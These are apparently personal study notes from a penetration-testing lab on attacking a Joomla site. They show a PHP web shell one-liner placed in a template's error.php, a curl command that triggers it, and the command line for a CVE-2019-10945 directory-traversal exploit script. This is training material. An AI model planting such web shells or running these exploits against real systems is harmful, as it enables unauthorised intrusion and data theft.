Like WordPress and Drupal, Joomla has had its fair share of **vulnerabilities against the core application and vulnerable extensions**. Furthermore, like the others, it is possible to **gain remote code execution** if we can log in to the admin backend.

## Abusing Built-In Functionality
---
- Using the credentials that we obtained in the examples from the last section, **==`admin:admin`, let's log in to the target backend at `http://dev.inlanefreight.local/administrator`.==** 
- Once logged in, we can see many options available to us. For our purposes, we would like to **==add a snippet of PHP code to gain RCE.==** We can do this by **customizing a template.**
	- ![[Pasted image 20260715003841.png]]
- Next, we can click on a template name. Let's **choose `protostar` under the `Template` column header.** This will bring us to the `Templates: Customise` page.
	- ![[Pasted image 20260715003917.png]]
- It is a good idea to get in the habit of **==using non-standard file names and parameters for our web shells to not make them easily accessible==** to a "drive-by" attacker during the assessment.
- We can also p**assword protect and even limit access down to our source IP address.** Also, we must always remember to **==clean up web shells as soon as we are done==** with them but still include the file name, file hash, and location in our final report to the client.
- Let's c**hoose the `error.php` page.** We'll add a PHP one-liner to gain code execution as follows:

	- $ `system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);`

	- ![[Pasted image 20260715004113.png]]
- Once this is in, **click on `Save & Close` at the top** and confirm code execution using `cURL`"
	- `curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id`

- From here, we can **==upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors==** or focus on **==lateral movement within the corporate network.==**

## Leveraging Known Vulnerabilities
---
- Just because a vu**lnerability was disclosed and received a CVE does not mean that it is exploitable or a working public PoC** exploit is available.
- Searching a site such as **==`exploit-db` shows over 1,400 entries for Joomla, with the vast majority being for Joomla extensions==**.

- Let's dig into a Joomla core vulnerability that **==affects version `3.9.4`, which our target==** `http://dev.inlanefreight.local/` was found to be running during our enumeration.
- Researching a bit, we find that this version of **Joomla is likely vulnerable to ==[CVE-2019-10945](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945)== which is a directory traversal and authenticated file deletion vulnerability.** 
- We can **use [this](https://www.exploit-db.com/exploits/46710) exploit script to leverage the vulnerability** and list the c**ontents of the webroot and other directories**. The python3 version of this same script can be found [here](https://github.com/dpgg101/CVE-2019-10945). 
- **We can also use it to delete files (not recommended)**. This could lead to **==access to sensitive files such as a configuration file or script holding credentials==** if we can then access it via the application URL. An attacker could also cause damage by deleting necessary files if the webserver user has the proper permissions.

- We can run the script by specifying the `--url`, `--username`, `--password`, and `--dir` flags:
	
	- $`python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /`

# Q/A
---
- ![[Pasted image 20260715010329.png]]
- ![[Pasted image 20260715010444.png]]